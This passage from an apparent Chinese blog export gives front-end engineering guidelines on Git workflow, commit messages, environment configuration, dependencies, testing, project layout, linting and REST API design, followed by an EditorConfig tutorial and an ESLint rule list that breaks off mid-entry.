合并分支后删除本地和远程功能分支 如果不删除需求分支，大量僵尸分支的存在会导致分支列表的混乱。而且该操作还能确保有且仅有一次合并到master 或 develop。只有当这个功能还在开发中时对应的功能分支才存在 在进行合并请求之前，请确保您的功能分支可以成功构建，并已经通过了所有的测试（包括代码规则检查） 因为您即将将代码提交到这个稳定的分支。而如果您的功能分支测试未通过，那您的目标分支的构建有很大的概率也会失败。此外，确保在进行合并请求之前应用代码规则检查。因为它有助于我们代码的可读性，并减少格式化的代码与实际业务代码更改混合在一起导致的混乱问题 使用 这个 .gitignore文件 此文件已经囊括了不应该和您开发的代码一起推送至远程仓库（remote repository）的系统文件列表。另外，此文件还排除了大多数编辑器的设置文件夹和文件，以及最常见的（工程开发）依赖目录 保护您的 develop 和 master 分支 这样可以保护您的生产分支免受意外情况和不可回退的变更 1.2 Git 工作流 基于以上原因, 我们将 功能分支工作流 ， 交互式变基的使用方法 结合一些 Gitflow中的基础 (比如，命名和使用一个develop branch)一起使用。 主要步骤如下 针对一个新项目, 在您的项目目录初始化您的项目。 如果是（已有项目）随后的功能开发/代码变动，这一步请忽略 12cd &lt;项目目录&gt;git init 检出（Checkout） 一个新的功能或故障修复（feature/bug-fix）分支 1git checkout -b &lt;分支名称&gt; 新增代码变更 git commit -a 会独立启动一个编辑器用来编辑您的说明信息，这样的好处是可以专注于写这些注释说明 12git addgit commit -a （切换至功能分支并且）通过交互式变基从您的develop分支中获取最新的代码提交，以更新您的功能分支 您可以使用 –autosquash 将所有提交压缩到单个提交。没有人会愿意（看到） develop 分支中的单个功能开发就占据如此多的提交历史 12git checkout &lt;branchname&gt;git rebase -i --autosquash develop 如果没有冲突请跳过此步骤，如果您有冲突, 就需要解决它们并且继续变基操作 12git add &lt;file1&gt; &lt;file2&gt; ...git rebase --continue 推送您的（功能）分支。变基操作会改变提交历史, 所以您必须使用 -f 强制推送到远程（功能）分支。 如果其他人与您在该分支上进行协同开发，请使用破坏性没那么强的 –force-with-lease 参数 当您进行 rebase 操作时，您会改变功能分支的提交历史。这会导致 Git 拒绝正常的 git push 。那么，您只能使用 -f 或 –force 参数了 1git push -f 提交一个合并请求（Pull Request） Pull Request 会被负责代码审查的同事接受，合并和关闭 如果您完成了开发，请记得删除您的本地分支。 1git branch -d &lt;分支&gt; （使用以下代码）删除所有已经不在远程仓库维护的分支 1git fetch -p &amp;&amp; for branch in `git branch -vv | grep ': gone]' | awk '&#123;print $1&#125;'`; do git branch -D $branch; done 1.3 如何写好 Commit Message 坚持遵循关于提交的标准指南，会让在与他人合作使用 Git 时更容易。这里有一些经验法则 用新的空行将标题和主体两者隔开 Git 非常聪明，它可将您提交消息的第一行识别为摘要。实际上，如果您尝试使用 git shortlog ，而不是 git log ，您会看到一个很长的提交消息列表，只会包含提交的 id 以及摘要（，而不会包含主体部分） 将标题行限制为50个字符，并将主体中一行超过72个字符的部分折行显示 提交应尽可能简洁明了，而不是写一堆冗余的描述 标题首字母大写 不要用句号结束标题 使用主体部分去解释 是什么 和 为什么 而不是 怎么做 2. 文档 可以使用这个 模板 作为 README （的一个参考） 对于具有多个存储库的项目，请在各自的 README 文件中提供它们的链接 随项目的进展，持续地更新 README 给您的代码添加详细的注释，这样就可以清楚每个主要部分的含义 不要把注释作为坏代码的借口。保持您的代码干净整洁 也不要把那些清晰的代码作为不写注释的借口 当代码更新，也请确保注释的同步更新 3. 环境如果需要，请分别定义 development, test 和 production 三个环境 不同的环境可能需要不同的数据、token、API、端口等。您可能需要一个隔离的 development 环境，它调用 mock 的 API，mock 会返回可预测的数据，使自动和手动测试变得更加容易。或者您可能只想在 production 环境中才启用 Google Analytics（分析） 依据不同的环境变量加载部署的相关配置，不要将这些配置作为常量添加到代码库中 您会有令牌，密码和其他有价值的信息。这些配置应正确地从应用程序内部分离开来，这样代码库就可以随时独立发布，不会包含这些敏感配置信息 怎么做： 使用 .env 文件来存储环境变量，并将其添加到 .gitignore 中使得排除而不被提交（到仓库）。另外，再提交一个 .env.example 作为开发人员的参考配置。对于生产环境，您应该依旧以标准化的方式设置环境变量 建议您在应用程序启动之前校验一下环境变量 它可能会将其他人从上小时的故障排查中解救 12345678910111213141516171819202122232425262728293031323334353637383940const joi = require('joi')const envVarsSchema = joi.object(&#123; NODE_ENV: joi.string() .valid(['development', 'production', 'test', 'provision']) .required(), PORT: joi.number() .required(), LOGGER_LEVEL: joi.string() .valid(['error', 'warn', 'info', 'verbose', 'debug', 'silly']) .default('info'), LOGGER_ENABLED: joi.boolean() .truthy('TRUE') .truthy('true') .falsy('FALSE') .falsy('false') .default(true)&#125;).unknown() .required()const &#123; error, value: envVars &#125; = joi.validate(process.env, envVarsSchema) if (error) &#123; throw new Error(`Config validation error: $&#123;error.message&#125;`)&#125;const config = &#123; env: envVars.NODE_ENV, isTest: envVars.NODE_ENV === 'test', isDevelopment: envVars.NODE_ENV === 'development', logger: &#123; level: envVars.LOGGER_LEVEL, enabled: envVars.LOGGER_ENABLED &#125;, server: &#123; port: envVars.PORT &#125; // ...&#125;module.exports = config; 3.1 一致的开发环境在 package.json 里的 engines 中设置您的node版本 让其他人可以清晰的知道这个项目中用的什么node版本 另外，使用 nvm 并在您的项目根目录下创建一个 .nvmrc 文件。不要忘了在文档中标注 任何使用nvm的人都可以使用 nvm use 来切换到合适的node版本 最好设置一个检查 node 和 npm 版本的 preinstall 脚本 某些依赖项可能会在新版本的 npm 中安装失败。 如果可以的话最好使用 Docker 镜像 它可以在整个工作流程中为您提供一致的环境，而且不用花太多的时间来解决依赖或配置 使用本地模块，而不是使用全局安装的模块 您不能指望您的同事在自己的全局环境都安装了相应的模块，本地模块可以方便您分享您的工具 3.2 依赖一致性确保您的团队成员获得与您完全相同的依赖。 因为您希望代码在任何开发环境中运行都能像预期的一样 在npm@5或者更高版本中使用 package-lock.json 我们没有 npm@5 或者，您可以使用 yarn ，并确保在 README.md 中标注了使用 yarn 。您的锁文件和package.json在每次依赖关系更新后应该具有相同的版本 我不太喜欢 Yarn 不喜欢 Yarn，太糟糕了。对于旧版本的npm，在安装新的依赖关系时使用 -save --save-exact ，并在发布之前创建npm-shrinkwrap.json 4. 依赖持续跟踪您当前的可用依赖包: 举个例子, npm ls --depth=0 查看这些软件包是否未使用或者与开发项目无关: depcheck 您可能会在代码中包含未使用的库，这会增大生产包的大小。请搜索出这些未使用的依赖关系并去掉它们吧 在使用依赖之前，请检查他的下载统计信息，看看它是否被社区大量使用： npm-stat 更多的使用量很大程度上意味着更多的贡献者，这通常意味着拥有更好的维护，这些能确保错误能够被快速地发现并修复 在使用依赖之前，请检查它是否具有良好而成熟的版本发布频率与大量的维护者：例如， npm view async 如果维护者没有足够快地合并修补程序，那么这些贡献者也将会变得不积极不高效 如果需要使用那些不太熟悉的依赖包，请在使用之前与团队进行充分讨论 始终确保您的应用程序在最新版本的依赖包上面能正常运行，而不是无法使用：npm outdated 依赖关系更新有时包含破坏性更改。当显示需要更新时，请始终先查看其发行说明。并逐一地更新您的依赖项，如果出现任何问题，可以使故障排除更容易。可以使用类似 npm-check-updates 的酷炫工具 5. 测试如果需要，请构建一个 test 环境. 虽然有时在 production 模式下端到端测试可能看起来已经足够了，但有一些例外：比如您可能不想在生产环境下启用数据分析功能，只能用测试数据来填充（污染）某人的仪表板。另一个例子是，您的API可能在 production 中才具有速率限制，并在请求达到一定量级后会阻止您的测试请求 将测试文件放在使用 .test.js 或 .spec.js 命名约定的测试模块，比如 moduleName.spec.js 您肯定不想进入一个层次很深的文件夹结构来查找里面的单元测试 将其他测试文件放入独立的测试文件夹中以避免混淆 一些测试文件与任何特定的文件实现没有特别的关系。您只需将它放在最有可能被其他开发人员找到的文件夹中：test 文件夹。这个名字：test也是现在的标准，被大多数JavaScript测试框架所接受 编写可测试代码，避免副作用（side effects），提取副作用，编写纯函数 您想要将业务逻辑拆分为单独的测试单元。您必须“尽量减少不可预测性和非确定性过程对代码可靠性的影响” 纯函数是一种总是为相同的输入返回相同输出的函数。相反地，不纯的函数是一种可能会有副作用，或者取决于来自外部的条件来决定产生对应的输出值的函数。这使得它不那么可预测 使用静态类型检查器 有时您可能需要一个静态类型检查器。它为您的代码带来一定程度的可靠性 先在本地 develop 分支运行测试，待测试通过后，再进行pull请求 您不想成为一个导致生产分支构建失败的人吧。在您的rebase之后运行测试，然后再将您改动的功能分支推送到远程仓库。 记录您的测试，包括在 README 文件中的相关说明部分 这是您为其他开发者或者 DevOps 专家或者 QA 或者其他如此幸运能和您一起协作的人留下的便捷笔记 6. 结构布局与命名请围绕产品功能/页面/组件，而不是围绕角色来组织文件。此外，请将测试文件放在他们对应实现的旁边 不规范 1234567.├── controllers| ├── product.js| └── user.js├── models| ├── product.js| └── user.js 规范 123456789.├── product| ├── index.js| ├── product.js| └── product.test.js├── user| ├── index.js| ├── user.js| └── user.test.js 比起一个冗长的列表文件，创建一个单一责权封装的小模块，并在其中包括测试文件。将会更容易浏览，更一目了然 将其他测试文件放在单独的测试文件夹中以避免混淆 这样可以节约您的团队中的其他开发人员或DevOps专家的时间 使用 ./config 文件夹，不要为不同的环境制作不同的配置文件。 当您为不同的目的（数据库，API等）分解不同的配置文件;将它们放在具有容易识别名称（如 config ）的文件夹中才是有意义的。请记住不要为不同的环境制作不同的配置文件。这样并不是具有扩展性的做法，如果这样，就会导致随着更多应用程序部署被创建出来，新的环境名称也会不断被创建，非常混乱。 配置文件中使用的值应通过环境变量提供 将脚本文件放在./scripts文件夹中。包括 bash 脚本和 node 脚本。 很可能最终会出现很多脚本文件，比如生产构建，开发构建，数据库feeders，数据库同步等 将构建输出结果放在./build文件夹中。将build/添加到.gitignore中以便忽略此文件夹 命名为您最喜欢的就行，dist看起来也蛮酷的。但请确保与您的团队保持一致性。放置在该文件夹下的东西应该是已经生成（打包、编译、转换）或者被移到这里的。您产生什么编译结果，您的队友也可以生成同样的结果，所以没有必要将这些结果提交到远程仓库中。除非您故意希望提交上去。 文件名和目录名请使用 PascalCase camelCase 风格。组件请使用 PascalCase 风格 CheckBox/index.js 应该代表 CheckBox 组件，也可以写成 CheckBox.js ，但是不能写成冗长的 CheckBox/CheckBox.js 或 checkbox/CheckBox.js 理想情况下，目录名称应该和 index.js 的默认导出名称相匹配。 这样您就可以通过简单地导入其父文件夹直接使用您预期的组件或模块 7. 代码风格7.1 若干个代码风格指导对新项目请使用 Stage2 和更高版本的 JavaScript（现代化）语法。对于老项目，保持与老的语法一致，除非您打算把老的项目也更新为现代化风格 这完全取决于您的选择。我们使用转换器来使用新的语法糖。Stage2更有可能最终成为规范的一部分，而且仅仅只需经过小版本的迭代就会成为规范 在构建过程中包含代码风格检查 在构建时中断下一步操作是一种强制执行代码风格检查的方法。强制您认真对待代码。请确保在客户端和服务器端代码都执行代码检查 使用 ESLint - Pluggable JavaScript linter 去强制执行代码检查 我们个人很喜欢 eslint ，不强制您也喜欢。它拥有支持更多的规则，配置规则的能力和添加自定义规则的能力 针对 JavaScript 我们使用Airbnb JavaScript Style Guide , 更多请阅读。 请依据您的项目和您的团队选择使用所需的JavaScript 代码风格 当使用FlowType的时候，我们使用 ESLint的Flow样式检查规则。 Flow 引入了很少的语法，而这些语法仍然需要遵循代码风格并进行检查 使用 .eslintignore 将某些文件或文件夹从代码风格检查中排除 当您需要从风格检查中排除几个文件时，就再也不需要通过 eslint-disable 注释来污染您的代码了 在Pull Request之前，请删除任何 eslint 的禁用注释 在处理代码块时禁用风格检查是正常现象，这样就可以关注在业务逻辑。请记住把那些 eslint-disable 注释删除并遵循风格规则 根据任务的大小使用 //TODO： 注释或做一个标签（ticket） 这样您就可以提醒自己和他人有这样一个小的任务需要处理（如重构一个函数或更新一个注释）。对于较大的任务，可以使用由一个lint规则（no-warning-comments）强制要求其完成（并移除注释）的//TODO（＃3456），其中的#3456号码是一个标签（ticket），方便查找且防止相似的注释堆积导致混乱 随着代码的变化，始终保持注释的相关性。删除那些注释掉的代码块 代码应该尽可能的可读，您应该摆脱任何分心的事情。如果您在重构一个函数，就不要注释那些旧代码，直接把要注释的代码删除吧 避免不相关的和搞笑的的注释，日志或命名 请使用有意义容易搜索的命名，避免缩写名称。对于函数使用长描述性命名。功能命名应该是一个动词或动词短语，需要能清楚传达意图的命名。 依据《代码整洁之道》的step-down规则，对您的源代码文件中的函数（的声明）进行组织。高抽象级别的函数（调用了低级别函数的函数）在上，低抽象级别函数在下，（保证了阅读代码时遇到未出现的函数仍然是从上往下的顺序，而不会打断阅读顺序地往前查找并且函数的抽象层次依次递减）。 7.2 强制的代码风格标准让您的编辑器提示您关于代码风格方面的错误。 请将 eslint-plugin-prettier 与 eslint-config-prettier 和您目前的ESLint配置一起搭配使用 考虑使用Git钩子 Git的钩子能大幅度地提升开发者的生产力。在做出改变、提交、推送至暂存区或者生产环境的过程中（充分检验代码），再也不需要担心（推送的代码会导致）构建失败 将Git的precommit钩子与Prettier结合使用 虽然prettier自身已经非常强大，但是每次将其作为单独的一个npm任务去格式化代码，并不是那么地高效。 这正是lint-staged（还有husky）可以解决的地方。关于如何配置 lint-staged 请阅读这里 以及如何配置 husky 请阅读 8. 日志避免在生产环境中使用客户端的控制台日志 您在构建过程可以把（应该）它们去掉，但是请确保您在代码风格检查中提供了有关控制台日志的警告信息。 产出生产环境的可读生产日志记录。一般使用在生产模式下所使用的日志记录库 (比如 winston 或者 node-bunyan)。 它通过添加着色、时间戳、log到控制台或者文件中，甚至是夜以继日地轮流log到文件，来减少故障排除中那些令人不愉快的事情。 9. API9.1 API 设计 因为我们试图实施开发出结构稳健的 Restful 接口，让团队成员和客户可以简单而一致地使用它们 缺乏一致性和简单性会大大增加集成和维护的成本。这就是为什么API设计这部分会包含在这个文档中的原因 我们主要遵循资源导向的设计方式。它有三个主要要素：资源，集合和 URLs 资源具有数据，嵌套，和一些操作方法。 一组资源称为一个集合。 URL标识资源或集合的线上位置 这是针对开发人员（您的主要API使用者）非常著名的设计方式。除了可读性和易用性之外，它还允许我们在无需了解API细节的情况下编写通用库和一些连接器 使用kebab-case（短横线分割）的URL。 在查询字符串或资源字段中使用camelCase模式。 在URL中使用多个kebab-case作为资源名称。 总是使用复数名词来命名指向一个集合的url：/users 基本上，它可读性会更好，并可以保持URL的一致性。 在源代码中，将复数转换为具有列表后缀名描述的变量和属性 复数形式的URL非常好，但在源代码中使用它却很微妙而且容易出错，所以要小心谨慎。 坚持这样一个概念：始终以集合名起始并以标识符结束 12/students/245743/airports/kjfk 避免这样的网址 1GET /blogs/:blogId/posts/:postId/summary 这不是在指向资源，而是在指向属性。您完全可以将属性作为参数传递，以减少响应 URLs里面请尽量少用动词 因为如果您为每个资源操作使用一个动词，您很快就会维护一个很大的URL列表，而且没有一致的使用模式，这会使开发人员难以学习。此外，我们还要使用动词做别的事情 为非资源型请求使用动词。在这种情况下，您的API并不需要返回任何资源。而是去执行一个操作并返回执行结果。这些不是 CRUD（创建，查询，更新和删除）操作 1/translate?text=Hallo 因为对于 CRUD，我们在资源或集合URL上使用 HTTP 自己带的方法。我们所说的动词实际上是指Controllers。您通常不会开发这些东西 请求体或响应类型如果是JSON，那么请遵循camelCase规范为JSON属性命名来保持一致性 这是一个 JavaScript 项目指南，其中用于生成JSON的编程语言以及用于解析JSON的编程语言被假定为 JavaScript 如何使用HTTP方法来操作CRUD功能 GET: 查询资源的表示法 POST: 创建一些新的资源或者子资源 PUT: 更新一个存在的资源 PATCH: 更新现有资源。它只更新所提供的字段，不管其他字段 DELETE: 删除一个存在的资源 对于嵌套资源，请在URL中把他们的关系表现出来。例如，使用id将员工与公司联系起来 这是一种自然的方式，方便资源的认知 GET /schools/2/students , 应该从学校2得到所有学生的名单 GET /schools/2/students/31 , 应该得到学生31的详细信息，且此学生属于学校2 DELETE /schools/2/students/31 , 应删除属于学校2的学生31 PUT /schools/2/students/31 , 应该更新学生31的信息，仅在资源URL上使用PUT方式，而不要用收集 POST /schools , 应该创建一所新学校，并返回创建的新学校的细节。在集合URL上使用POST 对于具有v前缀（v1，v2）的版本，使用简单的序数。并将其移到URL的左侧，使其具有最高的范围表述 1http://api.domain.com/v1/schools/3/students 当您的 API 为第三方公开时，升级API会导致发生一些意料之外的影响，也可能导致使用您API的人无法使用您的服务和产品。而这时使用URL中版本化可以防止这种情况的发生 响应消息必须是自我描述的。一个很好的错误消息响应可能如下所示 12345&#123; \"code\": 1234, \"message\" : \"Something bad happened\", \"description\" : \"More details\"&#125; 或验证错误: 12345678910111213141516&#123; \"code\" : 2314, \"message\" : \"Validation Failed\", \"errors\" : [ &#123; \"code\" : 1233, \"field\" : \"email\", \"message\" : \"Invalid email\" &#125;, &#123; \"code\" : 1234, \"field\" : \"password\", \"message\" : \"No password provided\" &#125; ]&#125; 开发人员在使用这些由API​​构建的应用程序时，难免会需要在故障排除和解决问题的关键时刻使用到这些精心设计的错误消息。好的错误消息设计能节约大量的问题排查时间 _注意：尽可能保持安全异常消息的通用性。例如，别说不正确的密码，您可以换成无效的用户名或密码，以免我们不知不觉地通知用户他的用户名确实是正确的，只有密码不正确。这会让用户很懵逼。 只使用这8个状态代码，并配合您自定义的响应描述来表述程序工作一切是否正常，客户端应用程序发生了什么错误或API发生错误 200 OK GET, PUT 或 POST 请求响应成功. 201 Created 标识一个新实例创建成功。当创建一个新的实例，请使用POST方法并返回201状态码。 304 Not Modified 发现资源已经缓存在本地，浏览器会自动减少请求次数。 400 Bad Request 请求未被处理，因为服务器不能理解客户端是要什么。 401 Unauthorized 因为请求缺少有效的凭据，应该使用所需的凭据重新发起请求。 403 Forbidden 意味着服务器理解本次请求，但拒绝授权。 404 Not Found 表示未找到请求的资源。 500 Internal Server Error 表示请求本身是有效，但由于某些意外情况，服务器无法实现，服务器发生了故障 大多数 API 提供程序仅仅只使用一小部分 HTTP 状态代码而已。例如，Google GData API 仅使用了10个状态代码，Netflix 使用了9个，而 Digg 只使用了8个。当然，这些响应作为响应主体的附加信息。一共有超过 70 个 HTTP 状态代码。然而，大多数开发者不可能全部记住这 70 个状态码。因此，如果您选择不常用的状态代码，您将使应用程序开发人员厌烦构建应用程序，然后您还要跑到维基百科上面找出您要告诉他们的内容，多累啊 在您的响应中提供资源的总数 接受limit和offset参数 还应考虑资源暴露的数据量。API消费者并不总是需要资源的完整表述。可以使用一个字段查询参数，该参数用逗号分隔的字段列表来包括 1GET /student?fields=id,name,age,class 分页，过滤和排序功能并不需要从所有资源一开始就要得到支持。记录下那些提供过滤和排序的资源 9.2 API 安全 这些是一些基本的安全最佳实践 除非通过安全的连接（HTTPS），否则不要只使用基本认证。不要在URL中传输验证令牌：GET /users/123?token=asdf…. 因为令牌、用户ID和密码通过网络是明文传递的（它是base64编码，而base64是可逆编码），所以基本认证方案是不安全的 必须使用授权请求头在每个请求上发送令牌：Authorization: Bearer xxxxxx, Extra yyyyy 授权代码应该是短暂的 通过不响应任何HTTP请求来拒绝任何非TLS请求，以避免任何不安全的数据交换。响应403 Forbidden的HTTP请求。 考虑使用速率限制 保护您的API免受每小时数千次的机器人扫描威胁。您应该在早期就考虑实施流控 适当地设置HTTP请求头可以帮助锁定和保护您的Web应用程序 您的API应将收到的数据转换为规范形式，或直接拒绝响应，并返回400错误请求（400 Bad Request）的错误，并在其中包含有关错误或丢失数据的详细信息 所有通过Rest API交换的数据必须由API来校验 序列化JSON JSON编码器的一个关键问题是阻止任意的可执行代码在浏览器或在服务器中（如果您用nodejs的话）执行。您必须使用适当的JSON序列化程序对用户输入的数据进行正确编码，以防止在浏览器上执行用户提供的输入，这些输入可能会包含恶意代码，而不是正常的用户数据 验证内容类型，主要使用application/*.json（Content-Type 头字段） 例如，接受application/x-www-form-urlencodedMIME类型可以允许攻击者创建一个表单并触发一个简单的POST请求。服务器不应该假定Content-Type。缺少Content-Type请求头或异常的Content-Type请求头，应该让服务器直接以4XX响应内容去拒绝请求 9.3 API 文档 在README.md模板为 API 填写 API Reference 段落。 尽量使用示例代码来描述 API 授权方法 解释 URL 的结构（仅 path，不包括根 URL），包括请求类型（方法） 对于每个端点（endpoint）说明 如果存在 URL 参数就使用 URL 参数，并根据URL中使用到的名称来指定它们 12Required: id=[integer]Optional: photo_id=[alphanumeric] 如果请求类型为 POST，请提供如何使用的示例。上述的URL参数规则在这也可以适用。分为可选和必需 响应成功，应该对应什么样的状态代码，返回了哪些数据？当人们需要知道他们的回调应该是期望的样子，这很有用 12Code: 200Content: &#123; id : 12 &#125; 错误响应，大多数端点都存在许多失败的可能。从未经授权的访问到错误参数等。所有的（错误描述信息）都应该列在这里。虽然有可能会重复，但它却有助于防止别人的猜想（，减少使用时的排错时间）。例如 12345&#123; \"code\": 403, \"message\" : \"Authentication failed\", \"description\" : \"Invalid username or password\"&#125; 使用API​​设计工具，有很多开源工具可用于提供良好的文档 10. 证书 确保您有权使用的这些资源。如果您使用其中的软件库，请记住先查询MIT，Apache或BSD（以更好地了解您所能够拥有的权限），但如果您打算修改它们，请查看许可证详细信息。图像和视频的版权可能会导致法律问题","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"前端规范","slug":"前端规范","permalink":"https://ru23.com/tags/前端规范/"},{"name":"最佳实践","slug":"最佳实践","permalink":"https://ru23.com/tags/最佳实践/"}]},{"title":"editconfig配置","slug":"2018-01-editconfig","date":"2018-01-27T14:48:24.000Z","updated":"2018-10-24T09:32:28.621Z","comments":true,"path":"note/59f3075e.html","link":"","permalink":"https://ru23.com/note/59f3075e.html","excerpt":"","text":"简介 在团队开发中，统一的代码格式是必要的。但是不同开发人员的代码风格不同，代码编辑工具的默认格式也不相同，这样就造成代码的differ。而editorConfig可以帮助开发人员在不同的编辑器和IDE中定义和维护一致的编码风格 editorconfig 一个editorconfig文件例子，用于设置Python和JavaScript行尾和缩进风格的配置文件 123456789101112131415161718192021222324252627282930313233# EditorConfig is awesome: http://EditorConfig.org# top-most EditorConfig fileroot = true# Unix-style newlines with a newline ending every file[*]end_of_line = lfinsert_final_newline = true# Matches multiple files with brace expansion notation# Set default charset[*.&#123;js,py&#125;]charset = utf-8# 4 space indentation[*.py]indent_style = spaceindent_size = 4# Tab indentation (no size specified)[*.js]indent_style = tab# Indentation override for all JS under lib directory[lib/**.js]indent_style = spaceindent_size = 2# Matches the exact files either package.json or .travis.yml[&#123;package.json,.travis.yml&#125;]indent_style = spaceindent_size = 2 安装editorconfig 当打开一个文件时，EditorConfig插件会在打开文件的目录和其每一级父目录查找.editorconfig文件，直到有一个配置文件root=true。EditorConfig配置文件从上往下读取，并且路径最近的文件最后被读取。匹配的配置属性按照属性应用在代码上，所以最接近代码文件的属性优先级最高。 文件格式 EditorConfig文件使用INI格式。斜杠(/)作为路径分隔符，#或者;作为注释。EditorConfig文件使用UTF-8格式、CRLF或LF作为换行符 通配符 * 匹配除/之外的任意字符串 ** 匹配任意字符串 ? 匹配任意单个字符 [name] 匹配name字符 [!name] 匹配非name字符 {s1,s2,s3} 匹配任意给定的字符串(since 0.11.0) 属性 indent_style 设置缩进风格，tab或者空格。tab是hard tabs，space为soft tabs。 indent_size 缩进的宽度，即列数，整数。如果indent_style为tab，则此属性默认为tab_width。 tab_width 设置tab的列数。默认是indent_size。 end_of_line 换行符，lf、cr和crlf charset 编码，latin1、utf-8、utf-8-bom、utf-16be和utf-16le，不建议使用utf-8-bom。 trim_trailing_whitespace 设为true表示会除去换行行首的任意空白字符。 insert_final_newline 设为true表明使文件以一个空白行结尾 root 表明是最顶层的配置文件，发现设为true时，才会停止查找.editorconfig文件 例子 下面以sublime text为例，测试editorconfig是否起作用。首先需要给sublime安装EditorConfig插件，然后在项目的根目录新建文件”.editorconfig“，内容如下 12345678910111213141516171819# EditorConfig is awesome: &lt;a onclick=\"javascript:pageTracker._trackPageview('/outgoing/EditorConfig.org');\" href=\"http://EditorConfig.org\"&gt;http://EditorConfig.org&lt;/a&gt;# top-most EditorConfig fileroot = true# Unix-style newlines with a newline ending every file[*]end_of_line = lfinsert_final_newline = true# Matches multiple files with brace expansion notation# Set default charset[*.&#123;js,html,css&#125;]charset = utf-8# Tab indentation (no size specified)[*.js]indent_style = tabtab_width = 50","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"前端规范","slug":"前端规范","permalink":"https://ru23.com/tags/前端规范/"},{"name":"editconfig","slug":"editconfig","permalink":"https://ru23.com/tags/editconfig/"}]},{"title":"eslint 常用配置","slug":"2018-01-eslint-config","date":"2018-01-27T14:41:24.000Z","updated":"2018-10-24T09:32:31.323Z","comments":true,"path":"note/f387695a.html","link":"","permalink":"https://ru23.com/note/f387695a.html","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536'rules': &#123; // no-var 'no-var': 'error', // 要求或禁止 var 声明中的初始化 'init-declarations': 2, // 强制使用单引号 'quotes': ['error', 'single'], // 要求或禁止使用分号而不是 ASI 'semi': ['error', 'never'], // 禁止不必要的分号 'no-extra-semi': 'error', // 强制使用一致的换行风格 'linebreak-style': ['error', 'unix'], // 空格2个 'indent': ['error', 2, &#123;'SwitchCase': 1&#125;], // 指定数组的元素之间要以空格隔开(,后面)， never参数：[ 之前和 ] 之后不能带空格，always参数：[ 之前和 ] 之后必须带空格 'array-bracket-spacing': [2, 'never'], // 在块级作用域外访问块内定义的变量是否报错提示 'block-scoped-var': 0, // if while function 后面的&#123;必须与if在同一行，java风格。 'brace-style': [2, '1tbs', &#123;'allowSingleLine': true&#125;], // 双峰驼命名格式 'camelcase': 2, // 数组和对象键值对最后一个逗号， never参数：不能带末尾的逗号, always参数：必须带末尾的逗号， 'comma-dangle': [2, 'never'], // 控制逗号前后的空格 'comma-spacing': [2, &#123;'before': false, 'after': true&#125;], // 控制逗号在行尾出现还是在行首出现 'comma-style': [2, 'last'], // 圈复杂度 'complexity': [2, 9], // 以方括号取对象属性时，[ 后面和 ] 前面是否需要空格, 可选参数 never, always 'computed-property-spacing': [2, 'never'], // TODO 关闭 强制方法必须返回值，TypeScript强类型，不配置 // 'consistent-return': 0 &#125; 更多配置规则说明 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174\"no-alert\": 0,//禁止使用alert confirm prompt\"no-array-constructor\": 2,//禁止使用数组构造器\"no-bitwise\": 0,//禁止使用按位运算符\"no-caller\": 1,//禁止使用arguments.caller或arguments.callee\"no-catch-shadow\": 2,//禁止catch子句参数与外部作用域变量同名\"no-class-assign\": 2,//禁止给类赋值\"no-cond-assign\": 2,//禁止在条件表达式中使用赋值语句\"no-console\": 2,//禁止使用console\"no-const-assign\": 2,//禁止修改const声明的变量\"no-constant-condition\": 2,//禁止在条件中使用常量表达式 if(true) if(1)\"no-continue\": 0,//禁止使用continue\"no-control-regex\": 2,//禁止在正则表达式中使用控制字符\"no-debugger\": 2,//禁止使用debugger\"no-delete-var\": 2,//不能对var声明的变量使用delete操作符\"no-div-regex\": 1,//不能使用看起来像除法的正则表达式/=foo/\"no-dupe-keys\": 2,//在创建对象字面量时不允许键重复 &#123;a:1,a:1&#125;\"no-dupe-args\": 2,//函数参数不能重复\"no-duplicate-case\": 2,//switch中的case标签不能重复\"no-else-return\": 2,//如果if语句里面有return,后面不能跟else语句\"no-empty\": 2,//块语句中的内容不能为空\"no-empty-character-class\": 2,//正则表达式中的[]内容不能为空\"no-empty-label\": 2,//禁止使用空label\"no-eq-null\": 2,//禁止对null使用==或!=运算符\"no-eval\": 1,//禁止使用eval\"no-ex-assign\": 2,//禁止给catch语句中的异常参数赋值\"no-extend-native\": 2,//禁止扩展native对象\"no-extra-bind\": 2,//禁止不必要的函数绑定\"no-extra-boolean-cast\": 2,//禁止不必要的bool转换\"no-extra-parens\": 2,//禁止非必要的括号\"no-extra-semi\": 2,//禁止多余的冒号\"no-fallthrough\": 1,//禁止switch穿透\"no-floating-decimal\": 2,//禁止省略浮点数中的0 .5 3.\"no-func-assign\": 2,//禁止重复的函数声明\"no-implicit-coercion\": 1,//禁止隐式转换\"no-implied-eval\": 2,//禁止使用隐式eval\"no-inline-comments\": 0,//禁止行内备注\"no-inner-declarations\": [2, \"functions\"],//禁止在块语句中使用声明（变量或函数）\"no-invalid-regexp\": 2,//禁止无效的正则表达式\"no-invalid-this\": 2,//禁止无效的this，只能用在构造器，类，对象字面量\"no-irregular-whitespace\": 2,//不能有不规则的空格\"no-iterator\": 2,//禁止使用__iterator__ 属性\"no-label-var\": 2,//label名不能与var声明的变量名相同\"no-labels\": 2,//禁止标签声明\"no-lone-blocks\": 2,//禁止不必要的嵌套块\"no-lonely-if\": 2,//禁止else语句内只有if语句\"no-loop-func\": 1,//禁止在循环中使用函数（如果没有引用外部变量不形成闭包就可以）\"no-mixed-requires\": [0, false],//声明时不能混用声明类型\"no-mixed-spaces-and-tabs\": [2, false],//禁止混用tab和空格\"linebreak-style\": [0, \"windows\"],//换行风格\"no-multi-spaces\": 1,//不能用多余的空格\"no-multi-str\": 2,//字符串不能用\\换行\"no-multiple-empty-lines\": [1, &#123;\"max\": 2&#125;],//空行最多不能超过2行\"no-native-reassign\": 2,//不能重写native对象\"no-negated-in-lhs\": 2,//in 操作符的左边不能有!\"no-nested-ternary\": 0,//禁止使用嵌套的三目运算\"no-new\": 1,//禁止在使用new构造一个实例后不赋值\"no-new-func\": 1,//禁止使用new Function\"no-new-object\": 2,//禁止使用new Object()\"no-new-require\": 2,//禁止使用new require\"no-new-wrappers\": 2,//禁止使用new创建包装实例，new String new Boolean new Number\"no-obj-calls\": 2,//不能调用内置的全局对象，比如Math() JSON()\"no-octal\": 